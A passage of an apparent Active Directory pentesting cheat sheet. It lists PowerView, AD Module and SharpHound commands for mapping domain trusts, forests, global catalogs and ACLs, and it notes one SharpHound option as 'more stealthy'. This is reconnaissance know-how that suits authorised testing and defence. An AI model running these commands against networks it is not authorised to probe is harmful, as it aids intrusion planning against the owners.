<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 325.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-PathAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">Path</span> <span class="cm-string">"\\dc.domain.local\sysvol"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-trusts">Trusts</h3>
<h4 id="bkmrk-map-trusts">Map trusts</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 159px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-MapDomainTrust</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-domain-trusts-for-th">Domain trusts for the current domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 362px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 361.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetDomainTrust</span> <span class="cm-comment">#Find potential external trust</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADTrust</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-forest">Forest</h3>
<h4 id="bkmrk-details-about-the-cu">Details about the current forest</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 260.333px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForest</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForest</span> <span class="cm-operator">-</span><span class="cm-identifier">Forest</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADForest</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADForest</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 203px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-all-domains-in-the-c">All domains in the current forest</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestDomain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestDomain</span> <span class="cm-operator">-</span><span class="cm-identifier">Forest</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">Get-ADForest</span><span class="cm-punctuation">).</span><span class="cm-identifier">Domains</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 182px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-global-catalogs-of-t">Global catalogs of the current forest</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 383px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 383.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestCatalog</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestCatalog</span> <span class="cm-operator">-</span><span class="cm-identifier">Forest</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADForest</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-operator">-</span><span class="cm-identifier">ExpandProperty</span> <span class="cm-identifier">GlobalCatalogs</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-forest-trusts">Forest trusts</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 434px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 434.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestTrust</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetForestTrust</span> <span class="cm-operator">-</span><span class="cm-identifier">Forest</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADTrust</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-string">'msDS-TrustForestTrustInfo -ne "$null"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-bloodhound-%2F-sharpho">BloodHound / SharpHound</h2>
<h3 id="bkmrk-basic-usage">Basic usage</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 514px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 228px; min-width: 513.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Default collection</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># All collection excepted GPOLocalGroup with all string properties</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">All</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectAllProperties</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Only collect from the DC, doesn't query the computers (more stealthy)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">DCOnly</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " 